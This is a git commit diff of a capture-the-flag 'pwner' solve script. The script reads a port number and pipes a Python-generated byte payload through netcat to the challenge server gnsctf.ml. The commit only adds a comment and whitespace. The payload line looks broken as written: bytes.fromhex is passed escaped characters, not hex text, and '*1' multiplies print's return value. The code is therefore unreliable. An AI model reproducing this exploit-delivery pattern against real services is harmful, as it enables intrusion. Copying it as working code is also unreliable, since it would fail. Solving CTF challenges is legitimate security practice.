e19c3a7080b5c8bd61f0435105ad96a8af6188b7
Jack Meng <jackmeng0814@gmail.com>
2021-10-27 13:38:06 -0400

    Update solve_pwner.sh

--- self_test/pwner/solve_pwner.sh
+++ self_test/pwner/solve_pwner.sh
@@ -4,6 +4,7 @@ echo -e "\e[31mRunning Script... \e[0m" ; echo ;
 
 echo "Enter Port" ; read portNum ;
 
-(python -c 'print(bytes.fromhex("\x45\x49\x04\x84\x05\x84\x23\x02\x99\x32").decode("latin-1"))*1') | nc gnsctf.ml $portNum
+# bundle the commands
+( python -c 'print(bytes.fromhex("\x45\x49\x04\x84\x05\x84\x23\x02\x99\x32").decode("latin-1"))*1' ) | nc gnsctf.ml $portNum
 
 echo -e "End Script" ; echo ; exit
